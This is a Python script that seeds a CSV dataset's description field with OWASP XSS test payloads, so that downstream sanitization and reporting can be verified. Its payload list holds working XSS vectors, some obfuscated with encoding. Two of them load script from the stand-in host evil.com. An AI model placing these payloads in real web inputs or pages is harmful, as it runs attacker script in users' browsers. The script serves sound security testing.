#!/usr/bin/env python3
"""
XSS Augmentation Script.
Injects OWASP XSS test payloads into a clean dataset's description field
for a configurable percentage of records to verify sanitization and reporting.
"""

from __future__ import annotations

import argparse
import os
import random
import polars as pl

# Sourced from the OWASP XSS Filter Evasion Cheat Sheet (matching test_security.py)
OWASP_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<script src=http://evil.com/xss.js></script>",
    "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
    "<script/src=http://evil.com/xss.js></script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=\"alert('XSS')\">",
    "<body onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<input type=\"image\" src=\"x\" onerror=\"alert(1)\">",
    "<a href=\"#\" onclick=\"alert(1)\">link</a>",
    "<a href=\"javascript:alert(1)\">click me</a>",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></iframe>",
    "<link rel=\"stylesheet\" href=\"javascript:alert(1)\">",
    "<div style=\"width: expression(alert(1))\">style xss</div>",
    "<div style=\"background-image: url(javascript:alert(1))\">style xss</div>",
    "<div style=\"behavior: url(xss.htc);\">style xss</div>",
    "&#X3c;script&#X3e;alert(1)&#X3c;/script&#X3e;",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<svg xmlns=\"http://www.w3.org/2000/svg\"><g onload=\"javascript:alert(1)\"></g></svg>",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
    "<object classid=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><param name=\"DataURL\" value=\"javascript:alert(1)\"></object>",
]

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Augment a dataset with OWASP XSS payloads in description fields."
    )
    parser.add_argument(
        "--input", "-i",
        type=str,
        default="data/processed/local_demo.csv",
        help="Input CSV file path (default: data/processed/local_demo.csv)"
    )
    parser.add_argument(
        "--output", "-o",
        type=str,
        default="data/processed/local_demo_augmented.csv",
        help="Output CSV file path (default: data/processed/local_demo_augmented.csv)"
    )
    parser.add_argument(
        "--rate", "-r",
        type=float,
        default=0.005,
        help="Percentage rate of records to augment with XSS (default: 0.005 [0.5%])"
    )
    parser.add_argument(
        "--seed", "-s",
        type=int,
        default=42,
        help="Random seed for reproducibility (default: 42)"
    )
    args = parser.parse_args()

    if not os.path.exists(args.input):
        raise FileNotFoundError(f"Input file not found: {args.input}. Run download_datasets.py first.")

    random.seed(args.seed)

    print(f"Reading dataset: {args.input}")
    df = pl.read_csv(args.input)
    total_rows = df.height
    num_to_augment = int(total_rows * args.rate)

    print(f"Augmenting {num_to_augment:,} records out of {total_rows:,} total ({args.rate*100:.2f}%) ...")

    # Select random indices to augment
    indices = list(range(total_rows))
    augment_indices = set(random.sample(indices, num_to_augment))

    descriptions = df["description"].to_list()
    augmented_col = []

    for idx, desc in enumerate(descriptions):
        if idx in augment_indices:
            payload = random.choice(OWASP_PAYLOADS)
            desc_val = str(desc or "")
            if desc_val:
                # Append or prepend the payload to make it look realistic
                if random.choice([True, False]):
                    new_desc = f"{desc_val} {payload}"
                else:
                    new_desc = f"{payload} {desc_val}"
            else:
                new_desc = payload
            descriptions[idx] = new_desc
            augmented_col.append("true")
        else:
            augmented_col.append("false")

    # Reconstruct the DataFrame
    df = df.with_columns([
        pl.Series("description", descriptions),
        pl.Series("augmented", augmented_col)
    ])

    # Ensure output folder exists
    os.makedirs(os.path.dirname(args.output), exist_ok=True)
    df.write_csv(args.output)
    
    print(f"Augmented dataset successfully written to: {args.output}")
    print(f"Stats: {num_to_augment:,} XSS vectors injected.")

if __name__ == "__main__":
    main()
